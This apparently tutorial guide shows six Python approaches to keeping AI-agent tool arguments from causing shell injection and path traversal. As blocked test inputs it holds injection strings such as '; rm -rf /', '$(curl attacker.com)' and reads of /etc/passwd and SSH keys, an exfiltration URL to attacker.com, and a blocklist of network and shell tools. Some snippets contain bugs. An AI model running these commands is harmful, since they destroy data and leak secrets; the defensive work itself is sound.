---
title: "Agent Doesn't Implement Tool Argument Sanitization for Shell Injection"
description: "How to sanitize tool arguments before passing them to shell commands, subprocess calls, or system utilities to prevent shell injection attacks."
categories: [security]
difficulty: advanced
---

When an agent constructs shell commands from user input or LLM-generated arguments, unsanitized values can inject arbitrary commands. A user who controls an argument can append `; rm -rf /` or `$(curl attacker.com)`. Sanitization must happen at the boundary before any shell execution.

## Solution 1: Allowlist-Based Argument Validator

Define a strict allowlist of permitted characters and patterns for each argument type. Reject anything outside the allowlist.

```python
import asyncio
import re
import subprocess
from dataclasses import dataclass
from typing import Any
import anthropic

client = anthropic.AsyncAnthropic()


@dataclass
class ArgSpec:
    name: str
    pattern: str    # Regex pattern defining valid values
    max_length: int = 256


# Allowlists for common argument types
ARG_SPECS: dict[str, ArgSpec] = {
    "filename":    ArgSpec("filename",    r"^[a-zA-Z0-9._\-]+$", max_length=255),
    "directory":   ArgSpec("directory",  r"^[a-zA-Z0-9._\-/]+$", max_length=512),
    "hostname":    ArgSpec("hostname",   r"^[a-zA-Z0-9.\-]+$", max_length=253),
    "port":        ArgSpec("port",       r"^[0-9]{1,5}$", max_length=5),
    "integer":     ArgSpec("integer",    r"^-?[0-9]+$", max_length=20),
    "identifier":  ArgSpec("identifier", r"^[a-zA-Z0-9_\-]+$", max_length=128),
    "email":       ArgSpec("email",      r"^[a-zA-Z0-9_.+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}$", max_length=254),
}


class ArgValidationError(ValueError):
    pass


def validate_arg(value: str, arg_type: str) -> str:
    spec = ARG_SPECS.get(arg_type)
    if spec is None:
        raise ArgValidationError(f"Unknown argument type: {arg_type!r}")
    if len(value) > spec.max_length:
        raise ArgValidationError(f"{arg_type} too long ({len(value)} > {spec.max_length})")
    if not re.fullmatch(spec.pattern, value):
        raise ArgValidationError(
            f"Invalid {arg_type}: {value!r} does not match {spec.pattern}"
        )
    return value


def safe_run(args: list[str]) -> str:
    """Run a subprocess using a list of args (no shell=True) after validation."""
    # Never use shell=True — always pass as a list
    result = subprocess.run(
        args,
        capture_output=True,
        text=True,
        timeout=30,
        shell=False,  # Critical: no shell interpretation
    )
    return result.stdout if result.returncode == 0 else f"Error: {result.stderr}"


async def agent_with_validated_tools(query: str) -> str:
    tools = [
        {
            "name": "ping_host",
            "description": "Ping a hostname to check reachability",
            "input_schema": {
                "type": "object",
                "properties": {
                    "hostname": {"type": "string", "description": "The hostname to ping"},
                    "count": {"type": "string", "description": "Number of pings (integer)"},
                },
                "required": ["hostname"],
            },
        }
    ]
    messages = [{"role": "user", "content": query}]

    while True:
        resp = await client.messages.create(
            model="claude-haiku-4-5-20251001",
            max_tokens=512,
            tools=tools,
            messages=messages,
        )
        if resp.stop_reason == "end_turn":
            return resp.content[0].text

        messages.append({"role": "assistant", "content": resp.content})
        results = []
        for block in resp.content:
            if block.type == "tool_use" and block.name == "ping_host":
                try:
                    hostname = validate_arg(block.input.get("hostname", ""), "hostname")
                    count = validate_arg(block.input.get("count", "3"), "integer")
                    # Safe: no shell=True, validated args
                    output = safe_run(["echo", f"ping {hostname} -c {count}"])  # Simulated
                    result_text = f"Ping result: {output}"
                except ArgValidationError as e:
                    result_text = f"[BLOCKED] Argument validation failed: {e}"
                results.append({"type": "tool_result", "tool_use_id": block.id, "content": result_text})
        messages.append({"role": "user", "content": results})


async def main():
    # Safe call
    print("Valid hostname test:")
    print(await agent_with_validated_tools("Ping example.com 3 times"))

    # Injection attempt (simulated)
    try:
        validate_arg("example.com; rm -rf /", "hostname")
    except ArgValidationError as e:
        print(f"\nInjection blocked: {e}")


asyncio.run(main())
```

## Solution 2: Shell Metacharacter Escaper

When shell execution is unavoidable, escape all metacharacters using `shlex.quote`.

```python
import asyncio
import shlex
import subprocess
import re
import anthropic

client = anthropic.AsyncAnthropic()

# Characters that have special meaning in shells
SHELL_METACHARACTERS = re.compile(r"[&|;`$<>(){}\"'\\!\n\r]")


def has_shell_metacharacters(value: str) -> bool:
    return bool(SHELL_METACHARACTERS.search(value))


def safe_quote(value: str) -> str:
    """Wrap value in single quotes and escape any embedded single quotes."""
    return shlex.quote(str(value))


def build_safe_command(template: str, **kwargs: str) -> list[str]:
    """
    Build a command as a list (preferred) or return a safely-quoted shell string.
    Always prefer list form; use this only when shell string is unavoidable.
    """
    for key, val in kwargs.items():
        if has_shell_metacharacters(val):
            raise ValueError(f"Argument {key!r} contains shell metacharacters: {val!r}")

    # Build as list — never use shell=True
    parts = shlex.split(template)
    return [kwargs.get(p.lstrip("{}").rstrip("{}"), p) if p.startswith("{") else p for p in parts]


async def tool_with_escape(tool_name: str, args: dict) -> str:
    if tool_name == "list_files":
        directory = args.get("path", ".")
        if has_shell_metacharacters(directory):
            return f"[BLOCKED] Shell metacharacters detected in path: {directory!r}"
        # Safe: list form, no shell=True
        result = subprocess.run(
            ["ls", "-la", directory],
            capture_output=True, text=True, timeout=10, shell=False
        )
        return result.stdout[:500] if result.returncode == 0 else f"Error: {result.stderr}"

    if tool_name == "read_file":
        filename = args.get("filename", "")
        if has_shell_metacharacters(filename) or ".." in filename:
            return f"[BLOCKED] Unsafe filename: {filename!r}"
        result = subprocess.run(
            ["cat", filename],
            capture_output=True, text=True, timeout=10, shell=False
        )
        return result.stdout[:1000] if result.returncode == 0 else f"Error: {result.stderr}"

    return f"[Unknown tool: {tool_name}]"


async def main():
    safe_path = "/tmp"
    unsafe_path = "/tmp; cat /etc/passwd"
    embedded_cmd = "$(whoami)"

    print(f"Safe path: {await tool_with_escape('list_files', {'path': safe_path})[:100]}")
    print(f"Injection blocked: {await tool_with_escape('list_files', {'path': unsafe_path})}")
    print(f"Command sub blocked: {await tool_with_escape('read_file', {'filename': embedded_cmd})}")


asyncio.run(main())
```

## Solution 3: Path Traversal and Directory Escape Prevention

Validate file paths to prevent directory traversal attacks (`../../etc/passwd`).

```python
import asyncio
import os
from pathlib import Path
import anthropic

client = anthropic.AsyncAnthropic()

ALLOWED_BASE_DIRS = [
    Path("/tmp/agent_workspace"),
    Path("/var/data/uploads"),
]


def resolve_safe_path(user_path: str, base_dir: Path) -> Path:
    """
    Resolve a user-supplied path relative to base_dir.
    Raises ValueError if the resolved path escapes the base directory.
    """
    # Resolve to absolute path without following symlinks first
    resolved = (base_dir / user_path).resolve()

    # Check that the resolved path is within the base directory
    try:
        resolved.relative_to(base_dir.resolve())
    except ValueError:
        raise ValueError(
            f"Path traversal detected: {user_path!r} resolves to {resolved}, "
            f"which is outside {base_dir}"
        )

    return resolved


def is_allowed_path(path: Path) -> bool:
    """Check if a path is under one of the allowed base directories."""
    resolved = path.resolve()
    return any(
        str(resolved).startswith(str(base.resolve()))
        for base in ALLOWED_BASE_DIRS
    )


async def safe_file_operation(operation: str, user_path: str, content: str = "") -> str:
    workspace = ALLOWED_BASE_DIRS[0]
    workspace.mkdir(parents=True, exist_ok=True)

    try:
        safe_path = resolve_safe_path(user_path, workspace)
    except ValueError as e:
        return f"[BLOCKED] {e}"

    if not is_allowed_path(safe_path):
        return f"[BLOCKED] Path not in allowed directories: {safe_path}"

    if operation == "read":
        if not safe_path.exists():
            return f"[NOT FOUND] {safe_path}"
        return safe_path.read_text()[:2000]

    if operation == "write":
        safe_path.parent.mkdir(parents=True, exist_ok=True)
        safe_path.write_text(content)
        return f"Written to {safe_path}"

    if operation == "list":
        if not safe_path.is_dir():
            return f"[NOT DIR] {safe_path}"
        return "\n".join(f.name for f in safe_path.iterdir())

    return f"[Unknown operation: {operation}]"


async def main():
    # Write a test file
    await safe_file_operation("write", "test.txt", "hello world")

    # Safe read
    print(await safe_file_operation("read", "test.txt"))

    # Traversal attempt
    print(await safe_file_operation("read", "../../etc/passwd"))
    print(await safe_file_operation("read", "../../../root/.ssh/id_rsa"))

    # Null byte injection
    print(await safe_file_operation("read", "test.txt\x00.jpg"))


asyncio.run(main())
```

## Solution 4: Argument Schema with Type Coercion and Range Checking

Define a typed schema for each tool's arguments and enforce it before execution.

```python
import asyncio
import ipaddress
import re
from dataclasses import dataclass, field
from typing import Any, Callable
import anthropic

client = anthropic.AsyncAnthropic()


@dataclass
class TypedArgSpec:
    name: str
    type_name: str
    coerce: Callable[[Any], Any]
    validate: Callable[[Any], str | None]  # Returns error string or None


def _coerce_int(v: Any) -> int:
    return int(str(v).strip())


def _coerce_str(v: Any) -> str:
    return str(v).strip()


def _make_range_validator(min_val: int, max_val: int):
    def _validate(v: int) -> str | None:
        if not min_val <= v <= max_val:
            return f"Value {v} out of range [{min_val}, {max_val}]"
        return None
    return _validate


def _validate_ip(v: str) -> str | None:
    try:
        ipaddress.ip_address(v)
        return None
    except ValueError:
        return f"Invalid IP address: {v!r}"


def _validate_hostname(v: str) -> str | None:
    if not re.fullmatch(r"[a-zA-Z0-9.\-]{1,253}", v):
        return f"Invalid hostname: {v!r}"
    return None


def _validate_no_metacharacters(v: str) -> str | None:
    if re.search(r"[&|;`$<>(){}\"'\\!\n\r]", v):
        return f"Shell metacharacters not allowed: {v!r}"
    return None


TOOL_ARG_SCHEMAS: dict[str, dict[str, TypedArgSpec]] = {
    "network_scan": {
        "target": TypedArgSpec("target", "hostname_or_ip", _coerce_str,
                               lambda v: _validate_hostname(v) or _validate_no_metacharacters(v)),
        "port": TypedArgSpec("port", "port_number", _coerce_int,
                             _make_range_validator(1, 65535)),
        "timeout": TypedArgSpec("timeout", "seconds", _coerce_int,
                                _make_range_validator(1, 60)),
    }
}


def validate_tool_args(tool_name: str, raw_args: dict) -> dict[str, Any]:
    schema = TOOL_ARG_SCHEMAS.get(tool_name)
    if not schema:
        return raw_args  # No schema — pass through

    validated = {}
    for arg_name, spec in schema.items():
        if arg_name not in raw_args:
            continue
        try:
            coerced = spec.coerce(raw_args[arg_name])
        except (ValueError, TypeError) as e:
            raise ValueError(f"Argument '{arg_name}': type coercion failed: {e}")

        error = spec.validate(coerced)
        if error:
            raise ValueError(f"Argument '{arg_name}': {error}")

        validated[arg_name] = coerced

    return validated


async def main():
    test_cases = [
        ("network_scan", {"target": "192.168.1.1", "port": "80", "timeout": "5"}),
        ("network_scan", {"target": "evil.com; rm -rf /", "port": "80", "timeout": "5"}),
        ("network_scan", {"target": "192.168.1.1", "port": "99999", "timeout": "5"}),
    ]

    for tool, args in test_cases:
        try:
            validated = validate_tool_args(tool, args)
            print(f"[OK] {tool}: {validated}")
        except ValueError as e:
            print(f"[BLOCKED] {tool}: {e}")


asyncio.run(main())
```

## Solution 5: Subprocess Argument Auditor

Log every subprocess invocation with its arguments for security auditing and anomaly detection.

```python
import asyncio
import json
import subprocess
import time
import uuid
from dataclasses import dataclass, field
from pathlib import Path

AUDIT_LOG = Path("/tmp/subprocess_audit.jsonl")


@dataclass
class SubprocessRecord:
    record_id: str = field(default_factory=lambda: str(uuid.uuid4())[:8])
    timestamp: float = field(default_factory=time.time)
    args: list[str] = field(default_factory=list)
    return_code: int | None = None
    stdout_len: int = 0
    stderr_len: int = 0
    duration_ms: float = 0.0
    blocked: bool = False
    block_reason: str | None = None

    def to_json(self) -> str:
        return json.dumps({
            "record_id": self.record_id,
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(self.timestamp)),
            "args": self.args,
            "return_code": self.return_code,
            "stdout_len": self.stdout_len,
            "stderr_len": self.stderr_len,
            "duration_ms": round(self.duration_ms, 2),
            "blocked": self.blocked,
            "block_reason": self.block_reason,
        })


BLOCKED_EXECUTABLES = {
    "rm", "dd", "mkfs", "shred", "wget", "curl", "nc", "netcat",
    "chmod", "chown", "sudo", "su", "bash", "sh", "zsh", "python",
}


def audit_subprocess(args: list[str]) -> SubprocessRecord:
    record = SubprocessRecord(args=args)

    if not args:
        record.blocked = True
        record.block_reason = "Empty args"
        return record

    executable = Path(args[0]).name
    if executable in BLOCKED_EXECUTABLES:
        record.blocked = True
        record.block_reason = f"Executable '{executable}' is in the blocklist"

    return record


def safe_subprocess(args: list[str], **kwargs) -> tuple[subprocess.CompletedProcess, SubprocessRecord]:
    record = audit_subprocess(args)

    if record.blocked:
        with AUDIT_LOG.open("a") as f:
            f.write(record.to_json() + "\n")
        raise PermissionError(f"[BLOCKED] {record.block_reason}")

    start = time.monotonic()
    result = subprocess.run(
        args,
        capture_output=True, text=True, timeout=30, shell=False,
        **kwargs,
    )
    record.duration_ms = (time.monotonic() - start) * 1000
    record.return_code = result.returncode
    record.stdout_len = len(result.stdout)
    record.stderr_len = len(result.stderr)

    with AUDIT_LOG.open("a") as f:
        f.write(record.to_json() + "\n")

    return result, record


def main():
    # Allowed command
    try:
        result, record = safe_subprocess(["ls", "/tmp"])
        print(f"[OK] ls /tmp: {record.stdout_len} chars output")
    except PermissionError as e:
        print(e)

    # Blocked command
    try:
        result, record = safe_subprocess(["curl", "https://attacker.com"])
    except PermissionError as e:
        print(f"[BLOCKED] curl: {e}")

    # Blocked shell
    try:
        result, record = safe_subprocess(["bash", "-c", "whoami"])
    except PermissionError as e:
        print(f"[BLOCKED] bash: {e}")

    print(f"\nAudit log: {AUDIT_LOG}")


main()
```

## Solution 6: LLM-Generated Command Review Before Execution

Before executing any shell command generated by an LLM, have a second model review it for safety.

```python
import asyncio
import subprocess
from dataclasses import dataclass
import anthropic

client = anthropic.AsyncAnthropic()
REVIEWER_MODEL = "claude-haiku-4-5-20251001"
MAX_RISK_LEVEL = "LOW"  # Only execute LOW risk commands


@dataclass
class CommandReview:
    command: list[str]
    risk_level: str          # LOW | MEDIUM | HIGH | CRITICAL
    concerns: list[str]
    safe_to_execute: bool
    suggested_alternative: str | None


async def review_command(args: list[str]) -> CommandReview:
    command_str = " ".join(args)
    resp = await client.messages.create(
        model=REVIEWER_MODEL,
        max_tokens=300,
        messages=[
            {
                "role": "user",
                "content": (
                    f"Review this shell command for security risks:\n`{command_str}`\n\n"
                    f"Classify risk as: LOW (safe read-only), MEDIUM (writes/net access), "
                    f"HIGH (destructive/privileged), CRITICAL (system-wide damage possible).\n\n"
                    f"Reply with JSON only:\n"
                    f'{{"risk_level": str, "concerns": [str], '
                    f'"safe_to_execute": bool, "suggested_alternative": str_or_null}}'
                ),
            }
        ],
    )
    import json, re
    try:
        match = re.search(r"\{[\s\S]+\}", resp.content[0].text)
        data = json.loads(match.group(0) if match else resp.content[0].text)
        return CommandReview(
            command=args,
            risk_level=data.get("risk_level", "HIGH"),
            concerns=data.get("concerns", []),
            safe_to_execute=data.get("safe_to_execute", False),
            suggested_alternative=data.get("suggested_alternative"),
        )
    except Exception:
        return CommandReview(
            command=args,
            risk_level="HIGH",
            concerns=["Review parsing failed — defaulting to blocked"],
            safe_to_execute=False,
            suggested_alternative=None,
        )


RISK_ORDER = {"LOW": 0, "MEDIUM": 1, "HIGH": 2, "CRITICAL": 3}


async def reviewed_execute(args: list[str]) -> str:
    review = await review_command(args)

    if not review.safe_to_execute or RISK_ORDER.get(review.risk_level, 3) > RISK_ORDER[MAX_RISK_LEVEL]:
        msg = f"[BLOCKED:{review.risk_level}] {'; '.join(review.concerns)}"
        if review.suggested_alternative:
            msg += f" | Alternative: {review.suggested_alternative}"
        return msg

    result = subprocess.run(args, capture_output=True, text=True, timeout=15, shell=False)
    return result.stdout[:500] if result.returncode == 0 else f"Error: {result.stderr[:200]}"


async def main():
    commands = [
        ["echo", "hello world"],
        ["ls", "/tmp"],
        ["rm", "-rf", "/tmp/test"],
        ["curl", "https://attacker.com/exfil?data=secrets"],
    ]

    for cmd in commands:
        result = await reviewed_execute(cmd)
        print(f"$ {' '.join(cmd)}")
        print(f"  → {result[:120]}\n")


asyncio.run(main())
```

## Comparison

| Solution | Defense type | Runtime cost | Shell-free | Best for |
|---|---|---|---|---|
| **Allowlist validator** | Regex allowlist | Zero | Yes | Simple, typed arguments |
| **Metacharacter escaper** | Blocklist + shlex | Zero | Partial | Legacy shell-string APIs |
| **Path traversal guard** | Path resolution | Zero | Yes | File system operations |
| **Typed schema validation** | Type + range check | Zero | Yes | Structured tool arguments |
| **Subprocess auditor** | Executable blocklist | Zero | Yes | Logging + enforcement |
| **LLM command review** | Semantic review | Low (Haiku) | Yes | Dynamic command generation |

Always use **allowlist validation** (Solution 1) and **path traversal guard** (Solution 3) — zero cost, prevents the most common injection vectors. Add **subprocess auditor** (Solution 5) for compliance logging. Use **LLM command review** (Solution 6) only when commands are dynamically generated and cannot be pre-validated.
